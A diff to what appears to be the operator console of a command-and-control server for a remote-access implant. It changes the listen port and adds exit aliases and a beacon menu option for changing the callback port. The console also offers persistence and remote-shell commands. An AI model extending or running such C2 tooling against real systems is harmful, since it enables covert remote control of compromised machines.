@@ -3,7 +3,7 @@ import socket, ssl, persist, beacon
 from socket import AF_INET, SOCK_STREAM, SO_REUSEADDR, SOL_SOCKET, SHUT_RDWR
 from printlib import *
 from os import path, remove, kill, getpid, listdir
-from sys import exit
+from sys import exit, argv
 from sys import path as sys_path
 from signal import SIGTERM
 import tasker
@@ -11,7 +11,7 @@ import tasker
 VERBOSE = True
 
 listen_addr = '0.0.0.0'
-listen_port = 8080
+listen_port = 8081
 conn = ""
 ###NEED TO WRITE EACH FILE ON EXECUTE THEN DELETE ON EXIT
 
@@ -224,7 +224,7 @@ def listen():
     5 - Persistence
     6 - Print uuid
     shell - Start a Shell
-    beacon - Change Beacon Interval"""
+    beacon - Change Beacon Settings"""
 
     context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
     context.verify_mode = ssl.CERT_REQUIRED
@@ -353,7 +353,7 @@ def listen():
                                 command = ""
                         if command in forbidden:
                             command = ""
-                        elif command == "back":
+                        elif command == "back" or command == "exit" or command == "quit":
                             cmd = ""
                         elif command == "":
                             pass
@@ -370,12 +370,14 @@ def listen():
                             print(data.rstrip("[END]"))
                             data = ""
                 elif cmd.upper() == "BEACON":
-                    ans = print_question("Select Option:\n1 - Query\n2 - Configure\n")
+                    ans = print_question_list("Select Option:","1 - Query","2 - Configure","3 - Change Callback Port")
 
                     if ans == "1":
                         beacon.query(conn)                            
-                    if ans == "2":    
+                    elif ans == "2":    
                         beacon.configure(conn)
+                    elif ans == "3":    
+                        beacon.change_port(conn)
                     else:
                         cmd = ""
                     
@@ -397,4 +399,7 @@ def main ():
         listen()
     finally:
         delete_keys()
+
+if len(argv) == 2:
+    listen_port = int(argv[1])
 main()
